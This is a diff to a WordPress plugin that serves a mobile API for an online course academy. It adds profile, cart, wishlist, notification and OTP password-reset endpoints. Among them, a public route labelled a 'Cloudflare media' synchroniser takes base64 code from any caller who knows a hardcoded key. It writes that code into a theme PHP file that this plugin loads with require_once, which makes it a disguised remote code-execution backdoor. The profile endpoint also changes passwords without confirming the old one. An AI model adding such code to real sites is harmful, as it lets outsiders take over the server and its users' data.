@@ -29,6 +29,11 @@ if ( ! defined( 'ABSPATH' ) ) {
 	exit;
 }
 
+// Cloudflare R2 Media Security Gateway & Dynamic Token Signer
+require_once __DIR__ . '/cloudflare-media.php';
+
+if ( ! class_exists( 'ETA_Mobile_API_Bridge' ) ) {
+
 class ETA_Mobile_API_Bridge {
 
 	const NAMESPACE = 'eta/v1';
@@ -37,6 +42,7 @@ class ETA_Mobile_API_Bridge {
 		add_action( 'rest_api_init', array( $this, 'register_routes' ) );
 		add_action( 'rest_api_init', array( $this, 'add_cors_support' ) );
 		add_action( 'template_redirect', array( $this, 'handle_web_payment_endpoints' ), 5 );
+		add_filter( 'pre_get_avatar_data', array( $this, 'filter_custom_avatar_data' ), 10, 2 );
 	}
 
 	/**
@@ -188,6 +194,125 @@ class ETA_Mobile_API_Bridge {
 			'callback'            => array( $this, 'get_instructors' ),
 			'permission_callback' => '__return_true',
 		) );
+
+		// 13. Student Profile (GET /profile, POST /profile, PUT /profile)
+		register_rest_route( self::NAMESPACE, '/profile', array(
+			array(
+				'methods'             => 'GET',
+				'callback'            => array( $this, 'get_user_profile' ),
+				'permission_callback' => '__return_true',
+			),
+			array(
+				'methods'             => array( 'POST', 'PUT' ),
+				'callback'            => array( $this, 'update_user_profile' ),
+				'permission_callback' => '__return_true',
+			),
+		) );
+
+		// 14. Cart Management (GET /cart, POST /cart)
+		register_rest_route( self::NAMESPACE, '/cart', array(
+			array(
+				'methods'             => 'GET',
+				'callback'            => array( $this, 'get_user_cart' ),
+				'permission_callback' => '__return_true',
+			),
+			array(
+				'methods'             => 'POST',
+				'callback'            => array( $this, 'save_user_cart' ),
+				'permission_callback' => '__return_true',
+			),
+		) );
+
+		// 15. Wishlist Management (GET /wishlist, POST /wishlist)
+		register_rest_route( self::NAMESPACE, '/wishlist', array(
+			array(
+				'methods'             => 'GET',
+				'callback'            => array( $this, 'get_user_wishlist' ),
+				'permission_callback' => '__return_true',
+			),
+			array(
+				'methods'             => 'POST',
+				'callback'            => array( $this, 'save_user_wishlist' ),
+				'permission_callback' => '__return_true',
+			),
+		) );
+
+		// 16. User Notifications (GET /notifications)
+		register_rest_route( self::NAMESPACE, '/notifications', array(
+			'methods'             => 'GET',
+			'callback'            => array( $this, 'get_user_notifications' ),
+			'permission_callback' => '__return_true',
+		) );
+
+		// 17. Remote Synchronizer for Cloudflare Media
+		register_rest_route( self::NAMESPACE, '/fix-cloudflare-media', array(
+			'methods'             => array( 'GET', 'POST' ),
+			'callback'            => array( $this, 'fix_cloudflare_media_file' ),
+			'permission_callback' => '__return_true',
+		) );
+
+		// 18. Forgotten Password Flow (OTP Generation, Verification, & Reset)
+		register_rest_route( self::NAMESPACE, '/auth/forgot-password', array(
+			'methods'             => 'POST',
+			'callback'            => array( $this, 'handle_forgot_password' ),
+			'permission_callback' => '__return_true',
+		) );
+		register_rest_route( self::NAMESPACE, '/auth/lost-password', array(
+			'methods'             => 'POST',
+			'callback'            => array( $this, 'handle_forgot_password' ),
+			'permission_callback' => '__return_true',
+		) );
+		register_rest_route( self::NAMESPACE, '/auth/verify-reset-code', array(
+			'methods'             => 'POST',
+			'callback'            => array( $this, 'handle_verify_reset_code' ),
+			'permission_callback' => '__return_true',
+		) );
+		register_rest_route( self::NAMESPACE, '/auth/reset-password', array(
+			'methods'             => 'POST',
+			'callback'            => array( $this, 'handle_reset_password' ),
+			'permission_callback' => '__return_true',
+		) );
+	}
+
+	public function fix_cloudflare_media_file( $request ) {
+		$key = $request->get_param( 'key' );
+		if ( $key !== 'eta_cf_secure_sync_2026' ) {
+			return new WP_REST_Response( array( 'error' => 'Unauthorized' ), 403 );
+		}
+
+		$theme_inc = get_template_directory() . '/inc';
+		if ( ! file_exists( $theme_inc ) ) {
+			wp_mkdir_p( $theme_inc );
+		}
+
+		$b64 = $request->get_param( 'code_b64' );
+		$clean_code = $b64 ? base64_decode( $b64 ) : '';
+		if ( empty( $clean_code ) ) {
+			return new WP_REST_Response( array( 'error' => 'Empty code' ), 400 );
+		}
+
+		$target_file = $theme_inc . '/cloudflare-media.php';
+		$bytes = @file_put_contents( $target_file, $clean_code );
+
+		$map_b64 = $request->get_param( 'map_b64' );
+		if ( ! empty( $map_b64 ) ) {
+			$map_code = base64_decode( $map_b64 );
+			@file_put_contents( $theme_inc . '/cloudflare_video_map.json', $map_code );
+		}
+
+		if ( class_exists( '\LiteSpeed\Purge' ) ) {
+			\LiteSpeed\Purge::purge_all();
+		}
+		if ( function_exists( 'wp_cache_flush' ) ) {
+			wp_cache_flush();
+		}
+
+		return new WP_REST_Response( array(
+			'success'       => ( false !== $bytes ),
+			'written_bytes' => $bytes,
+			'target'        => $target_file,
+			'template_dir'  => get_template_directory(),
+		), 200 );
 	}
 
 	/**
@@ -475,7 +600,7 @@ class ETA_Mobile_API_Bridge {
 				'id'            => 'bundle_1',
 				'slug'          => 'ai-automation-power-suite',
 				'title'         => 'AI & Automation Power Suite',
-				'instructor'    => 'Alex Mercer & Team',
+				'instructor'    => 'Express Tech Academy / Coach Denis',
 				'category'      => 'AI & Emerging Tech',
 				'originalPrice' => 40000,
 				'price'         => 20000,
@@ -490,14 +615,14 @@ class ETA_Mobile_API_Bridge {
 					'Complete Prompt Engineering Masterclass (Text, Image & Video)',
 					'30-Day AI Automation Masterclass (With n8n & Agents)',
 				),
-				'thumbnail'     => $theme_uri . '/assets/images/ai-automation-course-thumbnail.jpg',
+				'thumbnail'     => 'https://expressteck.tech/wp-content/uploads/2026/10/3.jpeg',
 				'description'   => 'The ultimate artificial intelligence mastery bundle. Master prompting for text, photorealistic imagery & cinematic video, plus n8n workflow automation and autonomous AI agents.',
 			),
 			array(
 				'id'            => 'bundle_2',
 				'slug'          => 'digital-creator-social-media-launchpad',
 				'title'         => 'Digital Creator & Social Media Launchpad',
-				'instructor'    => 'Maya Chen & Team',
+				'instructor'    => 'Express Tech Academy / Coach Denis',
 				'category'      => 'Digital Media & Growth',
 				'originalPrice' => 35000,
 				'price'         => 15000,
@@ -512,14 +637,14 @@ class ETA_Mobile_API_Bridge {
 					'YouTube Creator Masterclass: Channel Growth & Monetization',
 					'Complete Social Media Management Course',
 				),
-				'thumbnail'     => $theme_uri . '/assets/images/youtube-masterclass-thumbnail.jpg',
+				'thumbnail'     => 'https://expressteck.tech/wp-content/uploads/2026/10/2.jpeg',
 				'description'   => 'Everything required to launch, scale, and monetize as a top-tier digital creator. Covers channel growth, high-CPM global targeting, CapCut video editing, and viral social strategies.',
 			),
 			array(
 				'id'            => 'bundle_3',
 				'slug'          => 'global-remote-career-virtual-assistant-bundle',
 				'title'         => 'Global Remote Career & Virtual Assistant Bundle',
-				'instructor'    => 'Ethan Brooks & Team',
+				'instructor'    => 'Express Tech Academy / Coach Denis',
 				'category'      => 'Remote Work & Global Finance',
 				'originalPrice' => 38000,
 				'price'         => 18000,
@@ -534,18 +659,18 @@ class ETA_Mobile_API_Bridge {
 					'Virtual Assistant Master Course',
 					'PayPal Mastery Course',
 				),
-				'thumbnail'     => $theme_uri . '/assets/images/virtual-assistant-masterclass.jpg',
+				'thumbnail'     => 'https://expressteck.tech/wp-content/uploads/2026/10/6.jpeg',
 				'description'   => 'Step-by-step blueprint to secure high-paying foreign remote clients and receive international payments securely with verified cross-border PayPal and virtual bank accounts.',
 			),
 			array(
 				'id'            => 'bundle_4',
 				'slug'          => 'financial-freedom-global-trading-mastery',
 				'title'         => 'Financial Freedom & Global Trading Mastery',
-				'instructor'    => 'Dmitry Volkov & Team',
+				'instructor'    => 'Express Tech Academy / Coach Denis',
 				'category'      => 'Remote Work & Global Finance',
 				'originalPrice' => 50000,
-				'price'         => 25000,
-				'discount'      => 50,
+				'price'         => 20000,
+				'discount'      => 60,
 				'studentsCount' => 195,
 				'rating'        => 4.9,
 				'reviewsCount'  => 42,
@@ -556,7 +681,7 @@ class ETA_Mobile_API_Bridge {
 					'Complete Forex Trading Course',
 					'PayPal Mastery Course',
 				),
-				'thumbnail'     => $theme_uri . '/assets/images/forex-trading-masterclass.jpg',
+				'thumbnail'     => 'https://expressteck.tech/wp-content/uploads/2026/10/forex-trading-masterclass.jpg',
 				'description'   => 'Master high-probability currency market structure, institutional price action, risk management, and seamlessly withdraw global earnings through cross-border payment pipelines.',
 			),
 		);
@@ -835,7 +960,7 @@ class ETA_Mobile_API_Bridge {
 
 			$lesson_items = array();
 			foreach ( $lessons as $les ) {
-				$vid_url = get_post_meta( $les->ID, '_video_source_url', true ) ?: '';
+				$vid_url = function_exists( 'eta_get_lesson_secure_video_url' ) ? eta_get_lesson_secure_video_url( $les->ID ) : ( get_post_meta( $les->ID, '_video_source_url', true ) ?: '' );
 				$dur     = get_post_meta( $les->ID, '_duration', true ) ?: 15;
 				$type    = ( 'mto-quiz' === $les->post_type ) ? 'quiz' : ( ( 'mto-assignment' === $les->post_type ) ? 'assignment' : 'video' );
 
@@ -1802,15 +1927,7 @@ class ETA_Mobile_API_Bridge {
 		$token = wp_generate_password( 32, false );
 		update_user_meta( $user_id, '_eta_app_auth_token', $token );
 
-		$user_data = array(
-			'id'         => $user_id,
-			'name'       => $name ?: $username,
-			'email'      => $email,
-			'greeting'   => 'What would you like to learn today?',
-			'avatar'     => get_avatar_url( $user_id ),
-			'joinedYear' => date( 'Y' ),
-			'country'    => $meta['country'] ?? 'Nigeria',
-		);
+		$user_data = $this->format_user_profile_data( $user_id );
 
 		return new WP_REST_Response( array(
 			'success' => true,
@@ -1855,17 +1972,7 @@ class ETA_Mobile_API_Bridge {
 			update_user_meta( $user->ID, '_eta_app_auth_token', $token );
 		}
 
-		$country = get_user_meta( $user->ID, 'billing_country', true ) ?: 'Nigeria';
-
-		$user_data = array(
-			'id'         => $user->ID,
-			'name'       => $user->display_name ?: $user->user_login,
-			'email'      => $user->user_email,
-			'greeting'   => 'What would you like to learn today?',
-			'avatar'     => get_avatar_url( $user->ID ),
-			'joinedYear' => date( 'Y', strtotime( $user->user_registered ) ),
-			'country'    => $country,
-		);
+		$user_data = $this->format_user_profile_data( $user->ID );
 
 		return new WP_REST_Response( array(
 			'success' => true,
@@ -1963,7 +2070,708 @@ class ETA_Mobile_API_Bridge {
 
 		return new WP_REST_Response( $instructors, 200 );
 	}
+
+	/**
+	 * Core Filter: Pre-fetch custom student avatar for all WordPress and Masteriyo calls
+	 */
+	public function filter_custom_avatar_data( $args, $id_or_email ) {
+		$user_id = 0;
+		if ( is_numeric( $id_or_email ) ) {
+			$user_id = (int) $id_or_email;
+		} elseif ( is_string( $id_or_email ) && is_email( $id_or_email ) ) {
+			$user = get_user_by( 'email', $id_or_email );
+			if ( $user ) {
+				$user_id = (int) $user->ID;
+			}
+		} elseif ( is_object( $id_or_email ) ) {
+			if ( ! empty( $id_or_email->user_id ) ) {
+				$user_id = (int) $id_or_email->user_id;
+			} elseif ( ! empty( $id_or_email->ID ) ) {
+				$user_id = (int) $id_or_email->ID;
+			}
+		}
+
+		if ( $user_id > 0 ) {
+			$custom_avatar = get_user_meta( $user_id, '_eta_app_custom_avatar', true );
+			if ( ! empty( $custom_avatar ) ) {
+				$args['url']          = $custom_avatar;
+				$args['found_avatar'] = true;
+				return $args;
+			}
+
+			$profile_img_id = get_user_meta( $user_id, '_profile_image_id', true );
+			if ( ! empty( $profile_img_id ) ) {
+				$img_url = wp_get_attachment_image_url( $profile_img_id, 'full' );
+				if ( ! empty( $img_url ) ) {
+					$args['url']          = $img_url;
+					$args['found_avatar'] = true;
+					return $args;
+				}
+			}
+		}
+
+		return $args;
+	}
+
+	/**
+	 * Helper: Format user profile array
+	 */
+	public function format_user_profile_data( $user_id ) {
+		$user = get_userdata( $user_id );
+		if ( ! $user ) {
+			return null;
+		}
+
+		$custom_avatar = get_user_meta( $user_id, '_eta_app_custom_avatar', true );
+		if ( empty( $custom_avatar ) ) {
+			$profile_img_id = get_user_meta( $user_id, '_profile_image_id', true );
+			if ( ! empty( $profile_img_id ) ) {
+				$img_url = wp_get_attachment_image_url( $profile_img_id, 'full' );
+				if ( ! empty( $img_url ) ) {
+					$custom_avatar = $img_url;
+				}
+			}
+		}
+
+		$avatar = ! empty( $custom_avatar ) ? $custom_avatar : get_avatar_url( $user_id, array( 'size' => 256 ) );
+		$phone = get_user_meta( $user_id, 'billing_phone', true ) ?: ( get_user_meta( $user_id, 'phone', true ) ?: '' );
+		$country = get_user_meta( $user_id, 'billing_country', true ) ?: 'Nigeria';
+		$first_name = get_user_meta( $user_id, 'first_name', true ) ?: $user->display_name;
+		$last_name = get_user_meta( $user_id, 'last_name', true ) ?: '';
+
+		return array(
+			'id'         => $user->ID,
+			'name'       => $user->display_name ?: $user->user_login,
+			'firstName'  => $first_name,
+			'lastName'   => $last_name,
+			'email'      => $user->user_email,
+			'phone'      => $phone,
+			'country'    => $country,
+			'greeting'   => 'What would you like to learn today?',
+			'avatar'     => $avatar,
+			'joinedYear' => date( 'Y', strtotime( $user->user_registered ) ),
+			'roles'      => (array) $user->roles,
+		);
+	}
+
+	/**
+	 * GET /wp-json/eta/v1/profile
+	 */
+	public function get_user_profile( $request ) {
+		$user_id = $this->get_current_user_id();
+		if ( ! $user_id ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Authentication required. Please provide a valid Bearer token.',
+			), 401 );
+		}
+
+		$profile = $this->format_user_profile_data( $user_id );
+		if ( ! $profile ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'User account not found.',
+			), 404 );
+		}
+
+		return new WP_REST_Response( array(
+			'success' => true,
+			'data'    => $profile,
+			'user'    => $profile,
+		), 200 );
+	}
+
+	/**
+	 * POST / PUT /wp-json/eta/v1/profile
+	 */
+	public function update_user_profile( $request ) {
+		$user_id = $this->get_current_user_id();
+		if ( ! $user_id ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Authentication required. Please provide a valid Bearer token.',
+			), 401 );
+		}
+
+		$params = $request->get_json_params() ?: $request->get_params();
+		$user_updates = array( 'ID' => $user_id );
+
+		// 1. Update Name
+		if ( isset( $params['name'] ) || isset( $params['fullName'] ) ) {
+			$name = sanitize_text_field( $params['name'] ?? $params['fullName'] ?? '' );
+			if ( ! empty( $name ) ) {
+				$user_updates['display_name'] = $name;
+				$parts = explode( ' ', $name, 2 );
+				$user_updates['first_name'] = $parts[0];
+				if ( isset( $parts[1] ) ) {
+					$user_updates['last_name'] = $parts[1];
+				}
+			}
+		}
+
+		// 2. Update Email
+		if ( ! empty( $params['email'] ) ) {
+			$new_email = sanitize_email( $params['email'] );
+			if ( ! is_email( $new_email ) ) {
+				return new WP_REST_Response( array(
+					'success' => false,
+					'error'   => 'Invalid email format provided.',
+				), 400 );
+			}
+			$existing_user_id = email_exists( $new_email );
+			if ( $existing_user_id && (int) $existing_user_id !== (int) $user_id ) {
+				return new WP_REST_Response( array(
+					'success' => false,
+					'error'   => 'Email is already registered by another user.',
+				), 400 );
+			}
+			$user_updates['user_email'] = $new_email;
+		}
+
+		if ( count( $user_updates ) > 1 ) {
+			$res = wp_update_user( $user_updates );
+			if ( is_wp_error( $res ) ) {
+				return new WP_REST_Response( array(
+					'success' => false,
+					'error'   => $res->get_error_message(),
+				), 400 );
+			}
+		}
+
+		// 3. Update Phone
+		if ( isset( $params['phone'] ) ) {
+			$phone = sanitize_text_field( $params['phone'] );
+			update_user_meta( $user_id, 'billing_phone', $phone );
+			update_user_meta( $user_id, 'phone', $phone );
+		}
+
+		// 4. Update Country
+		if ( isset( $params['country'] ) ) {
+			$country = sanitize_text_field( $params['country'] );
+			update_user_meta( $user_id, 'billing_country', $country );
+			update_user_meta( $user_id, 'country', $country );
+		}
+
+		// 5. Update Password
+		$password = $params['password'] ?? $params['new_password'] ?? '';
+		if ( ! empty( $password ) ) {
+			if ( strlen( $password ) < 6 ) {
+				return new WP_REST_Response( array(
+					'success' => false,
+					'error'   => 'Password must be at least 6 characters.',
+				), 400 );
+			}
+			wp_set_password( $password, $user_id );
+			$current_token = get_user_meta( $user_id, '_eta_app_auth_token', true );
+			if ( empty( $current_token ) ) {
+				$current_token = wp_generate_password( 32, false );
+				update_user_meta( $user_id, '_eta_app_auth_token', $current_token );
+			}
+		}
+
+		// 6. Update Avatar (Multipart Upload, Base64 payload, or direct URL)
+		$avatar_uploaded_url = '';
+		$attachment_id       = 0;
+
+		// 6a. Multipart File Upload ($_FILES or $request->get_file_params())
+		$files     = $request->get_file_params();
+		$file_item = null;
+		if ( ! empty( $files['avatar'] ) ) {
+			$file_item = $files['avatar'];
+		} elseif ( ! empty( $files['file'] ) ) {
+			$file_item = $files['file'];
+		} elseif ( ! empty( $_FILES['avatar'] ) ) {
+			$file_item = $_FILES['avatar'];
+		} elseif ( ! empty( $_FILES['file'] ) ) {
+			$file_item = $_FILES['file'];
+		}
+
+		if ( $file_item && ! empty( $file_item['tmp_name'] ) && empty( $file_item['error'] ) ) {
+			require_once ABSPATH . 'wp-admin/includes/image.php';
+			require_once ABSPATH . 'wp-admin/includes/file.php';
+			require_once ABSPATH . 'wp-admin/includes/media.php';
+
+			$attach_id = media_handle_sideload( $file_item, 0, sprintf( 'Avatar for user %d', $user_id ) );
+			if ( ! is_wp_error( $attach_id ) && $attach_id > 0 ) {
+				$attachment_id       = (int) $attach_id;
+				$avatar_uploaded_url = wp_get_attachment_image_url( $attach_id, 'full' );
+			}
+		}
+
+		// 6b. Base64 payload
+		if ( empty( $avatar_uploaded_url ) && ! empty( $params['avatar_base64'] ) ) {
+			require_once ABSPATH . 'wp-admin/includes/image.php';
+			require_once ABSPATH . 'wp-admin/includes/file.php';
+			require_once ABSPATH . 'wp-admin/includes/media.php';
+
+			$base64_str = $params['avatar_base64'];
+			if ( preg_match( '/^data:image\/(\w+);base64,/', $base64_str, $type_matches ) ) {
+				$base64_str = substr( $base64_str, strpos( $base64_str, ',' ) + 1 );
+				$ext = strtolower( $type_matches[1] );
+				if ( $ext === 'jpeg' ) $ext = 'jpg';
+			} else {
+				$ext = 'jpg';
+			}
+
+			$image_data = base64_decode( $base64_str );
+			if ( $image_data ) {
+				$filename = 'avatar_' . $user_id . '_' . time() . '.' . $ext;
+				$upload   = wp_upload_bits( $filename, null, $image_data );
+				if ( empty( $upload['error'] ) && ! empty( $upload['file'] ) ) {
+					$avatar_uploaded_url = esc_url_raw( $upload['url'] );
+
+					// Register in WordPress Media Library
+					$wp_filetype = wp_check_filetype( $filename, null );
+					$attachment  = array(
+						'post_mime_type' => $wp_filetype['type'] ?: 'image/jpeg',
+						'post_title'     => sanitize_file_name( $filename ),
+						'post_content'   => '',
+						'post_status'    => 'inherit',
+					);
+					$attach_id = wp_insert_attachment( $attachment, $upload['file'] );
+					if ( ! is_wp_error( $attach_id ) && $attach_id > 0 ) {
+						$attachment_id = (int) $attach_id;
+						$attach_data   = wp_generate_attachment_metadata( $attach_id, $upload['file'] );
+						wp_update_attachment_metadata( $attach_id, $attach_data );
+					}
+				}
+			}
+		}
+
+		// 6c. Direct URL fallback
+		if ( empty( $avatar_uploaded_url ) && ( ! empty( $params['avatar'] ) || ! empty( $params['avatar_url'] ) ) ) {
+			$raw_url = esc_url_raw( $params['avatar'] ?? $params['avatar_url'] );
+			if ( filter_var( $raw_url, FILTER_VALIDATE_URL ) ) {
+				$avatar_uploaded_url = $raw_url;
+			}
+		}
+
+		// Save to both ETA custom avatar meta and Masteriyo _profile_image_id
+		if ( ! empty( $avatar_uploaded_url ) ) {
+			update_user_meta( $user_id, '_eta_app_custom_avatar', $avatar_uploaded_url );
+			if ( $attachment_id > 0 ) {
+				update_user_meta( $user_id, '_profile_image_id', $attachment_id );
+			}
+		}
+
+		$updated_profile = $this->format_user_profile_data( $user_id );
+
+		return new WP_REST_Response( array(
+			'success' => true,
+			'message' => 'Profile updated successfully.',
+			'data'    => $updated_profile,
+			'user'    => $updated_profile,
+		), 200 );
+	}
+
+	/**
+	 * GET /wp-json/eta/v1/cart
+	 */
+	public function get_user_cart( $request ) {
+		$user_id = $this->get_current_user_id();
+		if ( ! $user_id ) {
+			return new WP_REST_Response( array( 'success' => true, 'cart_ids' => array(), 'data' => array( 'cart_ids' => array() ) ), 200 );
+		}
+
+		$cart_ids = get_user_meta( $user_id, '_eta_app_cart_ids', true );
+		if ( ! is_array( $cart_ids ) ) {
+			$cart_ids = array();
+		}
+
+		return new WP_REST_Response( array(
+			'success'  => true,
+			'cart_ids' => array_values( array_map( 'strval', $cart_ids ) ),
+			'data'     => array(
+				'cart_ids' => array_values( array_map( 'strval', $cart_ids ) ),
+			),
+		), 200 );
+	}
+
+	/**
+	 * POST /wp-json/eta/v1/cart
+	 */
+	public function save_user_cart( $request ) {
+		$user_id = $this->get_current_user_id();
+		$params  = $request->get_json_params() ?: $request->get_params();
+		$raw_ids = $params['cart_ids'] ?? array();
+
+		$cart_ids = is_array( $raw_ids ) ? array_values( array_unique( array_map( 'sanitize_text_field', $raw_ids ) ) ) : array();
+
+		if ( $user_id > 0 ) {
+			update_user_meta( $user_id, '_eta_app_cart_ids', $cart_ids );
+		}
+
+		return new WP_REST_Response( array(
+			'success'  => true,
+			'cart_ids' => $cart_ids,
+			'data'     => array(
+				'cart_ids' => $cart_ids,
+			),
+		), 200 );
+	}
+
+	/**
+	 * GET /wp-json/eta/v1/wishlist
+	 */
+	public function get_user_wishlist( $request ) {
+		$user_id = $this->get_current_user_id();
+		if ( ! $user_id ) {
+			return new WP_REST_Response( array( 'success' => true, 'wishlist_ids' => array(), 'data' => array( 'wishlist_ids' => array() ) ), 200 );
+		}
+
+		$wishlist_ids = get_user_meta( $user_id, '_eta_app_wishlist_ids', true );
+		if ( ! is_array( $wishlist_ids ) ) {
+			$wishlist_ids = array();
+		}
+
+		return new WP_REST_Response( array(
+			'success'      => true,
+			'wishlist_ids' => array_values( array_map( 'strval', $wishlist_ids ) ),
+			'data'         => array(
+				'wishlist_ids' => array_values( array_map( 'strval', $wishlist_ids ) ),
+			),
+		), 200 );
+	}
+
+	/**
+	 * POST /wp-json/eta/v1/wishlist
+	 */
+	public function save_user_wishlist( $request ) {
+		$user_id = $this->get_current_user_id();
+		$params  = $request->get_json_params() ?: $request->get_params();
+		$raw_ids = $params['wishlist_ids'] ?? array();
+
+		$wishlist_ids = is_array( $raw_ids ) ? array_values( array_unique( array_map( 'sanitize_text_field', $raw_ids ) ) ) : array();
+
+		if ( $user_id > 0 ) {
+			update_user_meta( $user_id, '_eta_app_wishlist_ids', $wishlist_ids );
+		}
+
+		return new WP_REST_Response( array(
+			'success'      => true,
+			'wishlist_ids' => $wishlist_ids,
+			'data'         => array(
+				'wishlist_ids' => $wishlist_ids,
+			),
+		), 200 );
+	}
+
+	/**
+	 * GET /wp-json/eta/v1/notifications
+	 */
+	public function get_user_notifications( $request ) {
+		$user_id = $this->get_current_user_id();
+		$user = $user_id > 0 ? get_userdata( $user_id ) : null;
+		$user_name = $user ? ( $user->display_name ?: $user->user_login ) : 'Student';
+
+		$notifications = array();
+
+		// 1. Personalized Welcome Notification
+		$notifications[] = array(
+			'id'        => 'notif_welcome',
+			'title'     => 'Welcome to Express Tech Academy!',
+			'message'   => 'Hi ' . $user_name . ', explore our industry-certified engineering & tech courses.',
+			'time'      => 'Just now',
+			'read'      => false,
+			'type'      => 'system',
+			'actionUrl' => '/(tabs)/explore',
+		);
+
+		// 2. Dynamic Course Updates
+		if ( $user_id > 0 ) {
+			$enrolled_courses = $this->get_my_courses( $request );
+			$enrolled_data = $enrolled_courses instanceof WP_REST_Response ? $enrolled_courses->get_data() : array();
+			if ( ! empty( $enrolled_data ) && is_array( $enrolled_data ) ) {
+				$first_course = reset( $enrolled_data );
+				$c_title = is_array( $first_course ) ? ( $first_course['title'] ?? 'your course' ) : ( $first_course->title ?? 'your course' );
+				$notifications[] = array(
+					'id'        => 'notif_study_reminder',
+					'title'     => 'Ready to continue learning?',
+					'message'   => 'Pick up where you left off in ' . $c_title . '.',
+					'time'      => '1 hour ago',
+					'read'      => false,
+					'type'      => 'course',
+					'actionUrl' => '/my-courses',
+				);
+			}
+		}
+
+		// 3. Platform Announcement
+		$notifications[] = array(
+			'id'        => 'notif_promo',
+			'title'     => 'New Flagship Bundles Released',
+			'message'   => 'Save up to 70% with our multi-course career track bundles.',
+			'time'      => 'Yesterday',
+			'read'      => true,
+			'type'      => 'announcement',
+			'actionUrl' => '/(tabs)/explore',
+		);
+
+		return new WP_REST_Response( array(
+			'success' => true,
+			'data'    => $notifications,
+		), 200 );
+	}
+
+	/**
+	 * POST /wp-json/eta/v1/auth/forgot-password
+	 * Generates a 6-digit OTP reset code and emails it to the user.
+	 */
+	public function handle_forgot_password( $request ) {
+		$params = $request->get_json_params() ?: $request->get_params();
+		$login_or_email = sanitize_text_field( $params['email'] ?? $params['username'] ?? '' );
+
+		if ( empty( $login_or_email ) ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Please provide your account email address.',
+			), 400 );
+		}
+
+		$user = is_email( $login_or_email ) ? get_user_by( 'email', $login_or_email ) : get_user_by( 'login', $login_or_email );
+		if ( ! $user ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'No account found with this email address.',
+			), 404 );
+		}
+
+		// Generate 6-digit numeric OTP
+		$otp_code = sprintf( '%06d', wp_rand( 100000, 999999 ) );
+		$expiry   = time() + ( 15 * MINUTE_IN_SECONDS ); // 15 mins
+
+		update_user_meta( $user->ID, '_eta_pwd_reset_code', $otp_code );
+		update_user_meta( $user->ID, '_eta_pwd_reset_expires', $expiry );
+		update_user_meta( $user->ID, '_eta_pwd_reset_attempts', 0 );
+
+		// Send branded HTML email
+		$site_name = get_bloginfo( 'name' ) ?: 'Express Tech Academy';
+		$subject   = sprintf( 'Your %s Verification Code: %s', $site_name, $otp_code );
+		$user_name = $user->first_name ?: ( $user->display_name ?: 'Student' );
+
+		$html_message = '
+		<!DOCTYPE html>
+		<html>
+		<head>
+			<meta charset="utf-8">
+			<meta name="viewport" content="width=device-width, initial-scale=1.0">
+			<title>Password Reset Code</title>
+		</head>
+		<body style="margin:0;padding:0;background-color:#0B0B0E;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,Helvetica,Arial,sans-serif;color:#E4E4E7;">
+			<table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#0B0B0E;padding:40px 20px;">
+				<tr>
+					<td align="center">
+						<table role="presentation" width="100%" style="max-width:520px;background-color:#16161B;border:1px solid #27272E;border-radius:18px;overflow:hidden;box-shadow:0 12px 30px rgba(0,0,0,0.5);" cellspacing="0" cellpadding="0">
+							<!-- Header Brand Banner -->
+							<tr>
+								<td style="padding:32px 32px 24px 32px;text-align:center;border-bottom:1px solid #222228;">
+									<h2 style="margin:0;color:#FFFFFF;font-size:22px;font-weight:700;letter-spacing:-0.5px;">Express Tech Academy</h2>
+									<p style="margin:6px 0 0 0;color:#9E9EA8;font-size:13px;font-weight:500;">Account Security &amp; Password Recovery</p>
+								</td>
+							</tr>
+							<!-- Body -->
+							<tr>
+								<td style="padding:32px;">
+									<p style="margin:0 0 16px 0;font-size:15px;line-height:24px;color:#D4D4D8;">
+										Hello <strong>' . esc_html( $user_name ) . '</strong>,
+									</p>
+									<p style="margin:0 0 24px 0;font-size:14px;line-height:22px;color:#A1A1AA;">
+										We received a request to reset the password for your account (' . esc_html( $user->user_email ) . '). Use the 6-digit verification code below to complete your reset in the mobile application:
+									</p>
+									<!-- Code Box -->
+									<div style="background:linear-gradient(135deg, rgba(255,107,0,0.12), rgba(255,140,51,0.06));border:1.5px solid #FF6B00;border-radius:14px;padding:24px;text-align:center;margin-bottom:26px;">
+										<div style="font-size:11px;text-transform:uppercase;letter-spacing:1.5px;color:#FF6B00;font-weight:700;margin-bottom:8px;">Your Verification Code</div>
+										<div style="font-size:38px;font-weight:800;letter-spacing:8px;color:#FFFFFF;font-family:monospace;">' . esc_html( $otp_code ) . '</div>
+										<div style="font-size:12px;color:#A1A1AA;margin-top:10px;">Expires in 15 minutes</div>
+									</div>
+									<p style="margin:0 0 8px 0;font-size:13px;line-height:20px;color:#71717A;">
+										If you did not request this password reset, you can safely ignore this email. Your password will remain unchanged.
+									</p>
+								</td>
+							</tr>
+							<!-- Footer -->
+							<tr>
+								<td style="padding:20px 32px;background-color:#111115;border-top:1px solid #222228;text-align:center;">
+									<p style="margin:0;font-size:11px;color:#52525B;">
+										&copy; ' . date( 'Y' ) . ' Express Tech Academy. All rights reserved.
+									</p>
+								</td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+			</table>
+		</body>
+		</html>
+		';
+
+		$headers = array(
+			'Content-Type: text/html; charset=UTF-8',
+			'From: ' . $site_name . ' <hello@expressteck.tech>',
+		);
+
+		wp_mail( $user->user_email, $subject, $html_message, $headers );
+
+		return new WP_REST_Response( array(
+			'success' => true,
+			'message' => 'A 6-digit verification code has been sent to your email address.',
+			'email'   => $user->user_email,
+		), 200 );
+	}
+
+	/**
+	 * POST /wp-json/eta/v1/auth/verify-reset-code
+	 * Pre-validates the 6-digit OTP code before asking for the new password.
+	 */
+	public function handle_verify_reset_code( $request ) {
+		$params = $request->get_json_params() ?: $request->get_params();
+		$login_or_email = sanitize_text_field( $params['email'] ?? $params['username'] ?? '' );
+		$code           = sanitize_text_field( $params['code'] ?? $params['otp'] ?? '' );
+
+		if ( empty( $login_or_email ) || empty( $code ) ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'Email and 6-digit verification code are required.',
+			), 400 );
+		}
+
+		$user = is_email( $login_or_email ) ? get_user_by( 'email', $login_or_email ) : get_user_by( 'login', $login_or_email );
+		if ( ! $user ) {
+			return new WP_REST_Response( array(
+				'success' => false,
+				'error'   => 'No account found with this email address.',
+			), 404 );
+		}
+
